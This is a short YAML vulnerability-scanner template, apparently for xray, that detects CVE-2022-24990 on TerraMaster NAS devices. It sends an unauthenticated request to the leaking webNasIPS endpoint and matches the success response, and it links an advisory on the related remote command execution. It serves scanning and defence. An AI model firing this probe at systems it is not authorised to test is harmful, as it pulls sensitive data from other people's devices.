name: poc-yaml-terramaster-cve-2022-24990-info-leak
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /module/api.php?mobile/webNasIPS
            headers:
                User-Agent: TNAS
            follow_redirects: false
        expression: response.status == 200 && response.headers["X-Powered-By"].contains("TerraMaster") && response.body.bcontains(b"\"code\":true,\"msg\":\"webNasIPS successful\"")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation
